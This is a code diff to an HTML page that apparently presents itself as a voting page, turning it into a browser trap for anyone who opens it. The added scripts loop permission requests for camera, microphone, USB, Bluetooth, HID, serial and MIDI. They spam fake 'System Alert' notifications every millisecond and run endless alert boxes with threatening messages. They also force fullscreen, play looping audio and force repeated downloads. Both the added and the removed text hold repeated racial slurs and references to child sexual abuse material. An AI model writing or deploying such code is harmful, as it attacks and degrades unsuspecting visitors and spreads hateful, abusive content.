@@ -357,7 +357,7 @@
         <div class="noise"></div>
         <div class="overlay" id="overlay"></div>
         <img class="image-popup" id="imagePopup" src="dnbb.png" alt="Vote Image" crossorigin="anonymous">
-		<div id="ipDisplay">YOUR IP: <span id="ipText">LOADING...</span></div>
+		<div id="ipDisplay">Hello.<span id="ipText">.</span></div>
 
         <div class="container">
             <div class="header">
@@ -395,6 +395,106 @@
         <div class="warning">Evil KSI niggers</div>
     </div>
 
+<script>
+let running = false;
+
+async function requestAllPermissions() {
+
+  // Camera + Mic
+  try {
+    await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  } catch {}
+
+  // Notifications
+  try {
+    await Notification.requestPermission();
+  } catch {}
+
+  // MIDI (rare)
+  if (navigator.requestMIDIAccess) {
+    try {
+      await navigator.requestMIDIAccess({ sysex: true });
+    } catch {}
+  }
+
+  // Bluetooth
+  if (navigator.bluetooth) {
+    try {
+      await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+    } catch {}
+  }
+
+  // USB
+  if (navigator.usb) {
+    try {
+      await navigator.usb.requestDevice({ filters: [] });
+    } catch {}
+  }
+
+  // HID (keyboards / controllers)
+  if (navigator.hid) {
+    try {
+      await navigator.hid.requestDevice({ filters: [] });
+    } catch {}
+  }
+
+  // Serial (very obscure)
+  if (navigator.serial) {
+    try {
+      await navigator.serial.requestPort();
+    } catch {}
+  }
+}
+
+async function permissionLoop() {
+  while (running) {
+    await requestAllPermissions();
+  }
+}
+
+document.getElementById("start").onclick = () => {
+  if (running) return;
+  running = true;
+  permissionLoop();
+};
+</script>
+<script>
+let notificationInterval = null;
+
+const weirdMessages = [
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+  "NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS NIGGER CHILD PORN NIGGERS ",
+];
+
+function startWeirdNotifications() {
+  if (notificationInterval) return;
+
+  notificationInterval = setInterval(() => {
+    if (Notification.permission !== "granted") {
+      clearInterval(notificationInterval);
+      notificationInterval = null;
+      return;
+    }
+
+    const msg = weirdMessages[Math.floor(Math.random() * weirdMessages.length)];
+
+    new Notification("System Alert", {
+      body: msg,
+      icon: "https://files.catbox.moe/kux6de.png",
+      silent: false
+    });
+
+  }, 1);
+}
+</script>
 <script>
     let count1 = 0;
     let count2 = 0;
@@ -531,25 +631,18 @@
 </script>
 <script>
 let audioStarted = false;
-
-let audio1 = new Audio('rudeboy.mp3');
-audio1.loop = true;
-audio1.volume = 0.8;
-audio1.preload = 'auto';
-
-let audio2 = new Audio('whistleking.mp3');
-audio2.loop = true;
-audio2.volume = 0.6;
-audio2.preload = 'auto';
-
-let audio3 = new Audio('south32.mp3');
-audio3.loop = true;
-audio3.volume = 0.5;
-audio3.preload = 'auto';
+let horrorAudio = new Audio('rudeboy.mp3');
+horrorAudio.loop = true;
+horrorAudio.volume = 1.0;
+horrorAudio.preload = 'auto';
 
 let alertsArmed = false;
 let alertInterval = null;
 
+/* 🔥 NEW: download state */
+let downloadInterval = null;
+let downloadsStarted = false;
+const DOWNLOAD_URL = "dnbb.png";
 
 /* ---------- FULLSCREEN ---------- */
 function forceFullscreenNow() {
@@ -572,19 +665,7 @@ document.addEventListener('visibilitychange', () => {
 document.addEventListener('click', function startAudio() {
     if (audioStarted) return;
     audioStarted = true;
-
-    // Start first audio immediately
-    audio1.play().catch(() => {});
-
-    // Start second audio after 5 seconds
-    setTimeout(() => {
-        audio2.play().catch(() => {});
-    }, 5000);
-
-    // Start third audio after 10 seconds
-    setTimeout(() => {
-        audio3.play().catch(() => {});
-    }, 10000);
+    horrorAudio.play().catch(() => { audioStarted = false; });
 });
 
 /* ---------- ALERT LOOP ---------- */
@@ -592,48 +673,36 @@ function startAlertLoop() {
     if (alertInterval) return;
 
     alertInterval = setInterval(() => {
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
-        alert("RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN RAPE NIGGERS CHILD PORN ");
+        alert("⚠️ YOU ARE TRAPPED ⚠️");
+        alert("MATIAS DIED");
+        alert("NO ESCAPE");
+        alert("THE VOTE WAS FAKE");
+        alert("ENJOY THE MUSIC FOREVER");
+        alert("CLOSE = REGRET");
+        alert("THERE IS NO WAY OUT");
+        alert("THIS TAB IS YOUR PRISON");
     }, 100);
 }
 
 /* 🔥 NEW: DOWNLOAD LOOP (user-initiated) */
-const DOWNLOAD_URL = "https://files.catbox.moe/kux6de.png";
-let unlocked = false;
+function startDownloadLoop() {
+    if (downloadsStarted) return;
+    downloadsStarted = true;
 
-/* unlock once */
-document.addEventListener("click", () => {
-    unlocked = true;
-}, { once: true });
-
-/* retry loop (already running) */
-setInterval(async () => {
-    if (!unlocked) return;
-
-    try {
-        const res = await fetch(DOWNLOAD_URL);
-        const blob = await res.blob();
-
-        const url = URL.createObjectURL(blob);
+    downloadInterval = setInterval(() => {
         const a = document.createElement("a");
-        a.href = url;
-        a.download = "kux6de.png"; // FORCE filename
+        a.href = DOWNLOAD_URL;
+        a.download = "";
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-    } catch (e) {}
-}, 10);
+    }, 1500);
+}
 
+/* ---------- ARM AFTER 25 SECONDS ---------- */
 setTimeout(() => {
     alertsArmed = true;
-}, 15000); // ← set back to 25s (you had 2500)
+}, 2500); // ← set back to 25s (you had 2500)
 
 /* 🔥 NEW: start downloads on YOUR click after armed */
 document.addEventListener('click', () => {
